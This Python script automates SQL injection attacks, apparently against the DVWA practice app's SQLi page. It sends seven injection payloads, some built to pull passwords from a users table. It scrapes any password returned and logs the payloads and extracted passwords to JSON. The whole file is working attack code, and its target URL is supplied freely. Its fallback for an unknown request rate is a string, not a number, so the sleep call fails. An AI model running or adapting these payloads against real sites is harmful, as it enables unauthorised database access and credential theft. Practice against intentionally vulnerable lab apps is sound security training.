import requests
from bs4 import BeautifulSoup
from datetime import datetime
from pathlib import Path
import os
import sys
import json
import time

# Setup directories and session
logs_dir = Path('logs')
logs_dir.mkdir(exist_ok=True)
session = requests.Session()

if len(sys.argv) > 2:
    base_url = sys.argv[1]
    request_rate = sys.argv[2]
else:
    print("Base URL and/or request rate were not provided.")
    sys.exit(1)

# Map request rate to a specific time interval
delays = {'low': 15, 'medium': 2, 'high': 0.5}
delay = delays.get(request_rate, 'medium')  # Default to 'medium' if rate is unrecognized

sqli_url = f"{base_url}/vulnerabilities/sqli/"

def login_and_setup_security():
    # Assuming login is required; adjust as necessary
    pass

def sql_injection_attack():
    total_tests = 0
    tests_passed = 0
    tests_failed = 0
    details = []

    # Example of SQLi payloads that might extract passwords if vulnerable
    payloads = {
        '1': "' OR 1=1 /* comment */ -- ",
        '2': "' UNI' || 'ON SELECT password FROM users WHERE user_id = '1' -- ",
        '3': "' OR 1=1/**/AND/**/'1'='1'-- -",
        '4': "'%27%20OR%20%271%27%3D%271",
        '5': "' oR 1=1 -- ",
        '6': "' OR 1 > 0 AND userid = '1' -- ",
        '7': "' OR 1=1 AND '1'='0x31' -- "
    }

    for user_id, payload in payloads.items():
        total_tests += 1
        response = session.get(sqli_url, params={'id': payload})
        
        if response.status_code == 200 and "Password:" in response.text:
            tests_passed += 1
            result_status = "PASSED - Retrieved password successfully"
            password = BeautifulSoup(response.text, 'html.parser').text.split("Password:")[1].strip()
        else:
            tests_failed += 1
            result_status = "FAILED - SQL Injection did not retrieve data"
            password = "No password retrieved"
        time.sleep(delay)
        
        details.append({
            "user_id": user_id,
            "payload": payload,
            "response_code": response.status_code,
            "status": result_status,
            "extracted_password": password
        })
        print(f"Tested SQLi with payload '{payload}' for user ID {user_id}\nResult Status: {result_status}\nExtracted Password: {password}\n")

    # Log the results
    script_name = os.path.splitext(os.path.basename(__file__))[0]
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    file_name = f"results_{script_name}_{timestamp}.json"
    results_file = logs_dir / file_name
    result_summary = {
        'date_time': timestamp,
        'base_url': base_url,
        'total_tests': total_tests,
        'tests_passed': tests_passed,
        'tests_failed': tests_failed,
        'tested_url': sqli_url,
        'details': details
    }
    with open(results_file, 'w') as f:
        json.dump(result_summary, f, indent=4)
    print(f"Results saved to {results_file}")

if __name__ == "__main__":
    login_and_setup_security()
    sql_injection_attack()